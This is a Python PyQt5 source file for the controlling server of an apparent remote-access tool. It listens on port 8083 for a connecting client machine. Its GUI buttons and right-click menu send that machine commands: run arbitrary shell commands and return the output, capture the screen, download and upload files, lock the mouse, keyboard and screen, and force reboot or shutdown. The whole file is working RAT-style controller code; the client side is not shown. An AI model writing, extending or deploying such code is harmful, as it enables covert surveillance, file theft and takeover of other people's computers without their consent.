# -*- coding:utf-8 -*-
'''
 @Author:      GETF
 @Email:       GETF_own@163.com
 @DateTime:    2018-07-01 14:56:04
 @Description: 心里苦
'''


# Form implementation generated from reading ui file 'F:\GitHub\control\windows.ui'
#
# Created by: PyQt5 UI code generator 5.6
#
# WARNING! All changes made in this file will be lost!

from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtWidgets import QMessageBox,QWidget,QTableWidgetItem,QInputDialog,QLineEdit,QFileDialog
import os
import socket
import sys
import time

bind_ip = '0.0.0.0'
bind_port = 8083
server = None
filepath = os.path.abspath(os.path.dirname(__file__))

# init the server
def setup():
    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
    server.bind((bind_ip, bind_port))
    server.listen(5)
    print('[+] Listening on %s:%d' % (bind_ip, bind_port))
    return server


# 处理返回文件相关
def recvFile(client_socket,type):
    mark = True
    if (type == "jpg"):
        if (os.path.isfile(filepath+"/screenshot.jpg")):
            os.remove(filepath+"/screenshot.jpg")
        f = open(filepath+"/screenshot.jpg","wb")
    else:
        file = filepath+"/recvfile%s" % type
        f = open(file,"wb")

    while(1):
        data = client_socket.recv(1024)
        if (len(data)<8) and (data[:3].decode() == "EOF"):
            if data[3:5].decode() == "NN":
                # os.remove(file)
                mark = False
            else:
                mark = True

            break
        f.write(data)
    f.close()
    return mark

# 发送本地文件
def sendFile(client_socket, filename, destPath):
    try:
        f = open(filename,"rb")
    except:
        return False

    client_socket.send(destPath.encode())

    time.sleep(1)
    while(1):
        data = f.read(512)
        if not data:
            break
        client_socket.sendall(data)
    f.close()
    time.sleep(10)
    client_socket.sendall("EOF".encode())
    return True


# 对控制机进行操控
def handle_client(client_socket, cmd, param1, param2):
    if len(cmd) > 0:
        if cmd == "screenshot":#屏幕截图
            client_socket.send(cmd.encode())
            p = recvFile(client_socket,"jpg")
            return p
        elif cmd == "mouse":#鼠标锁死
            client_socket.send(cmd.encode())
            client_socket.send(param1.encode())
        elif cmd == "download":#下载文件
            client_socket.send(cmd.encode())
            client_socket.send(param1.encode())
            p = recvFile(client_socket,param1)
            return p
        elif cmd == "reboot":
            client_socket.send(cmd.encode())
        elif cmd == "shutdown":
            client_socket.send(cmd.encode())
        elif cmd == "cancel":
            client_socket.send(cmd.encode())
        elif cmd == "lock":
            client_socket.send(cmd.encode())
        elif cmd == "blockinput":
            client_socket.send(cmd.encode())
        elif cmd == "upload":
            client_socket.send(cmd.encode())
            p = sendFile(client_socket, param1, param2)
            return p

        # elif cmd == "kill-client":
        #     data = client_socket.recv(1024)
        #     return data
        elif cmd == "@":
            cmd = cmd+param1
            client_socket.send(cmd.encode())
        elif cmd == "$":
            cmd = cmd+param1
            client_socket.send(cmd.encode())
            data = client_socket.recv(5120)
            return data.decode('gbk')
        else:
            return None



# 定义UI
class Ui_MainWindow(QWidget):
    def setupUi(self, MainWindow):
        self.id = 1
        MainWindow.setObjectName("MainWindow")
        MainWindow.resize(800, 600)
        MainWindow.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
        MainWindow.setFixedSize(MainWindow.width(), MainWindow.height())
        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap(filepath+"/picture/title.ico"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        MainWindow.setWindowIcon(icon)
        self.menuBar = QtWidgets.QMenuBar(MainWindow)
        self.menuBar.setGeometry(QtCore.QRect(0, 0, 606, 26))
        self.menuBar.setObjectName("menuBar")
        self.centralWidget = QtWidgets.QWidget(MainWindow)
        self.centralWidget.setObjectName("centralWidget")
        self.pushButton = QtWidgets.QPushButton(self.centralWidget)
        self.pushButton.setGeometry(QtCore.QRect(0, 0, 221, 151))
        icon1 = QtGui.QIcon()
        icon1.addPixmap(QtGui.QPixmap(os.path.abspath(os.path.dirname(__file__))+"/picture/2018-06-30_170734.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.pushButton.setIcon(icon1)
        self.pushButton.setIconSize(QtCore.QSize(70, 70))
        self.pushButton.setObjectName("pushButton")
        self.pushButton.clicked.connect(self.screenshot)
        self.pushButton_2 = QtWidgets.QPushButton(self.centralWidget)
        self.pushButton_2.setGeometry(QtCore.QRect(220, 0, 201, 151))
        icon2 = QtGui.QIcon()
        icon2.addPixmap(QtGui.QPixmap(os.path.abspath(os.path.dirname(__file__))+"/picture/2018-06-30_171056.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.pushButton_2.setIcon(icon2)
        self.pushButton_2.setIconSize(QtCore.QSize(90, 90))
        self.pushButton_2.setObjectName("pushButton_2")
        self.pushButton_2.clicked.connect(self.mousecontrl)
        self.pushButton_3 = QtWidgets.QPushButton(self.centralWidget)
        self.pushButton_3.setGeometry(QtCore.QRect(420, 0, 201, 151))
        icon3 = QtGui.QIcon()
        icon3.addPixmap(QtGui.QPixmap(os.path.abspath(os.path.dirname(__file__))+"/picture/2018-06-30_171030.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.pushButton_3.setIcon(icon3)
        self.pushButton_3.setIconSize(QtCore.QSize(80, 80))
        self.pushButton_3.setObjectName("pushButton_3")
        self.pushButton_3.clicked.connect(self.downloadfile)
        self.pushButton_4 = QtWidgets.QPushButton(self.centralWidget)
        self.pushButton_4.setGeometry(QtCore.QRect(612, 0, 191, 151))
        icon4 = QtGui.QIcon()
        icon4.addPixmap(QtGui.QPixmap(os.path.abspath(os.path.dirname(__file__))+"/picture/2018-06-30_171320.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.pushButton_4.setIcon(icon4)
        self.pushButton_4.setIconSize(QtCore.QSize(70, 70))
        self.pushButton_4.setObjectName("pushButton_4")
        self.pushButton_4.clicked.connect(self.control_cmd)
        self.tableWidget = QtWidgets.QTableWidget(self.centralWidget)
        self.tableWidget.horizontalHeader().setSectionsClickable(False) #可以禁止点击表头的列
        self.tableWidget.setSelectionMode(QtWidgets.QAbstractItemView.SingleSelection)#设置只可以单选
        self.tableWidget.setSelectionBehavior(QtWidgets.QAbstractItemView.SelectRows)#设置 不可选择单个单元格，只可选择一行。
        self.tableWidget.setGeometry(QtCore.QRect(0, 150, 801, 451))
        self.tableWidget.setObjectName("tableWidget")
        self.tableWidget.setColumnCount(6)
        item = QtWidgets.QTableWidgetItem()
        self.tableWidget.setHorizontalHeaderItem(0, item)
        item = QtWidgets.QTableWidgetItem()
        self.tableWidget.setHorizontalHeaderItem(1, item)
        item = QtWidgets.QTableWidgetItem()
        self.tableWidget.setHorizontalHeaderItem(2, item)
        item = QtWidgets.QTableWidgetItem()
        self.tableWidget.setHorizontalHeaderItem(3, item)
        item = QtWidgets.QTableWidgetItem()
        self.tableWidget.setHorizontalHeaderItem(4, item)
        item = QtWidgets.QTableWidgetItem()
        self.tableWidget.setHorizontalHeaderItem(5, item)
        MainWindow.setCentralWidget(self.centralWidget)
        self.retranslateUi(MainWindow)
        self.tableWidget.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
        self.tableWidget.customContextMenuRequested['QPoint'].connect(self.rightMenuShow)
        QtCore.QMetaObject.connectSlotsByName(MainWindow)
        server = setup()
        self.client, addr = server.accept()
        data = self.client.recv(1024).split("#".encode())
        self.addClientToTable(str(data[1].decode()), addr[0], str(addr[1]), str(data[0].decode()), "凉凉")


    '''打开命令行'''
    def control_cmd(self):
        value, ok = QInputDialog.getText(self, "命令执行", "这是提示信息\n\n命令格式为cmd:", QLineEdit.Normal, "ipconfig")
        if value:
            data = handle_client(self.client, "$", value, "1")
            QMessageBox.about(self,"执行结果",  data)
        else:
            pass


    '''上传文件'''
    def downloadfile(self):
        value, ok = QInputDialog.getText(self, "文件控制", "这是提示信息\n\n命令格式为:dir/xx.txt", QLineEdit.Normal, "url.txt")
        if value:
            p = False
            p = handle_client(self.client, "download", value, "1")
            if p:
                QMessageBox.about(self,"执行结果",  "下载完成")
            else:
                QMessageBox.about(self,"执行结果",  "下载失败")
        else:
            pass

    '''上传文件'''
    def uploadfile(self):
        file_, filetype = QFileDialog.getOpenFileName(self,  "选取需要上传文件",  "C:/",  "All Files (*);;Text Files (*.txt)")
        if file_:
            p = False
            p = handle_client(self.client, "upload", file_ , "D:/1.txt")
            if p:
                QMessageBox.about(self,"执行结果",  "上传完成")
            else:
                QMessageBox.about(self,"执行结果",  "上传失败")
        else:
            pass

    '''鼠标锁定'''
    def mousecontrl(self):
        value, ok = QInputDialog.getText(self, "鼠标锁死", "这是提示信息\n\n命令格式为 time单位秒", QLineEdit.Normal, "10")
        if value:
            handle_client(self.client, "mouse", value, "1")
            QMessageBox.about(self,"执行结果",  "成功锁死")
        else:
            pass


    '''屏幕截图'''
    def screenshot(self):
        p = False
        p = handle_client(self.client, "screenshot", "1", "2")
        if p:
            QMessageBox.about(self,"执行结果",  "监控完成")
        else:
            QMessageBox.about(self,"执行结果",  "监控失败")

    '''发送消息'''
    def senddata(self):
        value, ok = QInputDialog.getText(self, "发送消息", "这是提示信息\n\n命令格式为message:", QLineEdit.Normal, "hello world")
        if value:
            handle_client(self.client, "@", value ,"1")
            QMessageBox.about(self,"执行结果",  "发送成功")
        else:
            pass

    '''强制重启'''
    def controlreboot(self):
        handle_client(self.client, "reboot", "1", "2")
        QMessageBox.about(self,"执行结果",  "执行成功，将于10秒后重启")


    '''强制关机'''
    def controlshutdown(self):
        handle_client(self.client, "shutdown", "1", "2")
        QMessageBox.about(self,"执行结果",  "执行成功，将于10秒后关机")

    '''取消关机重启'''
    def controlcancel(self):
        handle_client(self.client, "cancel", "1", "2")
        QMessageBox.about(self,"执行结果",  "执行成功，已经取消")

    '''强制锁屏'''
    def controllock(self):
        handle_client(self.client, "lock", "1", "2")
        QMessageBox.about(self,"执行结果",  "执行成功")

    '''锁住键盘'''
    def controllockinput(self):
        handle_client(self.client, "blockinput", "1", "2")
        QMessageBox.about(self,"执行结果",  "执行成功")


    '''增加一行'''
    def addClientToTable(self,name,ip,port,str1,str2):
        row = self.tableWidget.rowCount()
        self.tableWidget.setRowCount(row+1)
        num = str(self.id)
        self.id += 1
        self.tableWidget.setItem(row, 0, QTableWidgetItem(num))
        self.tableWidget.setItem(row, 1, QTableWidgetItem(name))
        self.tableWidget.setItem(row, 2, QTableWidgetItem(ip))
        self.tableWidget.setItem(row, 3, QTableWidgetItem(port))
        self.tableWidget.setItem(row, 4, QTableWidgetItem(str1))
        self.tableWidget.setItem(row, 5, QTableWidgetItem(str2))

    '''减少一行'''
    def removeClientFromTable(self,num):
        self.tableWidget.removeRow(num)




    '''鼠标右键事件'''
    def rightMenuShow(self):
        rightMenu = QtWidgets.QMenu(self.menuBar)

        self.actionreboot = QtWidgets.QAction(MainWindow)
        self.actionreboot.setObjectName("actionreboot")
        self.actionreboot.setText(QtCore.QCoreApplication.translate("MainWindow", "重新开机"))
        rightMenu.addAction(self.actionreboot)
        self.actionreboot.triggered.connect(self.controlreboot)

        self.actionshutdown = QtWidgets.QAction(MainWindow)
        self.actionshutdown.setObjectName("actionshutdown")
        self.actionshutdown.setText(QtCore.QCoreApplication.translate("MainWindow", "强制下线"))
        rightMenu.addAction(self.actionshutdown)
        self.actionshutdown.triggered.connect(self.controlshutdown)

        self.actioncancel = QtWidgets.QAction(MainWindow)
        self.actioncancel.setObjectName("actioncancel")
        self.actioncancel.setText(QtCore.QCoreApplication.translate("MainWindow", "取消下线与重启"))
        rightMenu.addAction(self.actioncancel)
        self.actioncancel.triggered.connect(self.controlcancel)

        self.actionsendmessage = QtWidgets.QAction(MainWindow)
        self.actionsendmessage.setObjectName("actionsendmessage")
        self.actionsendmessage.setText(QtCore.QCoreApplication.translate("MainWindow", "发送消息"))
        rightMenu.addAction(self.actionsendmessage)
        self.actionsendmessage.triggered.connect(self.senddata)

        self.actionlock = QtWidgets.QAction(MainWindow)
        self.actionlock.setObjectName("actionlock")
        self.actionlock.setText(QtCore.QCoreApplication.translate("MainWindow", "强制锁屏"))
        rightMenu.addAction(self.actionlock)
        self.actionlock.triggered.connect(self.controllock)

        self.actionlockinput = QtWidgets.QAction(MainWindow)
        self.actionlockinput.setObjectName("actionlockinput")
        self.actionlockinput.setText(QtCore.QCoreApplication.translate("MainWindow", "锁死键盘"))
        rightMenu.addAction(self.actionlockinput)
        self.actionlockinput.triggered.connect(self.controllockinput)

        self.actionuploadfile = QtWidgets.QAction(MainWindow)
        self.actionuploadfile.setObjectName("actionuploadfile")
        self.actionuploadfile.setText(QtCore.QCoreApplication.translate("MainWindow", "上传文件"))
        rightMenu.addAction(self.actionuploadfile)
        self.actionuploadfile.triggered.connect(self.uploadfile)

        rightMenu.exec_(QtGui.QCursor.pos())

    def retranslateUi(self, MainWindow):
        _translate = QtCore.QCoreApplication.translate
        MainWindow.setWindowTitle(_translate("MainWindow", "萤火client"))
        self.pushButton.setText(_translate("MainWindow", "屏幕监控"))
        self.pushButton_2.setText(_translate("MainWindow", "锁死鼠标"))
        self.pushButton_3.setText(_translate("MainWindow", "文件下载"))
        self.pushButton_4.setText(_translate("MainWindow", "命令执行"))
        item = self.tableWidget.horizontalHeaderItem(0)
        item.setText(_translate("MainWindow", "编号"))
        item = self.tableWidget.horizontalHeaderItem(1)
        item.setText(_translate("MainWindow", "用户名"))
        item = self.tableWidget.horizontalHeaderItem(2)
        item.setText(_translate("MainWindow", "ip地址"))
        item = self.tableWidget.horizontalHeaderItem(3)
        item.setText(_translate("MainWindow", "端口"))
        item = self.tableWidget.horizontalHeaderItem(4)
        item.setText(_translate("MainWindow", "电脑名"))
        item = self.tableWidget.horizontalHeaderItem(5)
        item.setText(_translate("MainWindow", "测试信息2"))
        __sortingEnabled = self.tableWidget.isSortingEnabled()
        self.tableWidget.setSortingEnabled(False)
        self.tableWidget.setSortingEnabled(__sortingEnabled)


if __name__ == "__main__":
    app = QtWidgets.QApplication(sys.argv)
    MainWindow = QtWidgets.QMainWindow()
    ui = Ui_MainWindow()
    ui.setupUi(MainWindow)
    MainWindow.show()
    sys.exit(app.exec_())

